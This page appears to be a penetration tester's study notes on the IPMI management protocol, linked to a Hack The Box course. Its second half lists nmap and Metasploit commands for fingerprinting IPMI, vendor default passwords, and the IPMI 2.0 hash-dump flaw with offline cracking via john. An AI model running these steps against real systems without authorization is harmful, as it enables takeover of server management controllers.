# IPMI

[![footprinting](../../../cybersecurity/_badges/htb/footprinting.svg)](https://academy.hackthebox.com/course/preview/footprinting)

<div class="row row-cols-lg-2"><div>

Intelligent Platform Management Interface (IPMI) is a protocol used by system administrators to manage computers.

It's an out-of-band protocol so it works even if the system is turned off or unresponsive. It's independent and works independently of the CPU, BIOS, memory, firmware, and operating system.

🐊️ **Port**: 623 (UDP)

It can be used to monitor components such as temperature, voltage, fans, and power supplies. A system utilizing IPMI version 2.0 can be managed from a console via a serial connection.
</div><div>

IPMI requires multiple components <small>(BMC, ICMB, IPMB, etc.)</small>. BMCs are controlling the motherboard. The most common ones are:

* Supermicro
* HPE iLO <small>(formerly HP iLO)</small>
* Dell DRAC
* Aspeed AST
* ...
</div></div>

<hr class="sep-both">

## IPMI Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

If we gain access to a BMC, we can monitor, reboot, power off, or reinstall the operating system.

* We can use [nmap](/cybersecurity/red-team/tools/scanners/ports/nmap.md) to find the IPMI version

```ps
$ nmap -sU --script ipmi-version -p 623 IP
```

* We can use [metasploit](/cybersecurity/red-team/tools/frameworks/metasploit/index.md) to find the IPMI version

```shell!
$ msfconsole -q
msf6> use auxiliary/scanner/ipmi/ipmi_version 
msf6> set RHOSTS IP
msf6> run
```
</div><div>

Default Passwords

* `ADMIN:ADMIN` (Supermicro)
* `Administrator:[A-Z0-9]{8}` (HPE iLO)
* `root:calvin` (Dell DRAC)

A flaw in IPMI 2.0 leads to the password hash being returned before authenticating. It can then be cracked offline.

```shell!
$ msfconsole -q
msf6> use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6> set RHOSTS IP
msf6> set OUTPUT_JOHN_FILE pjohn
msf6> run
msf6> exit
$ john pjohn -w /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt
```
</div></div>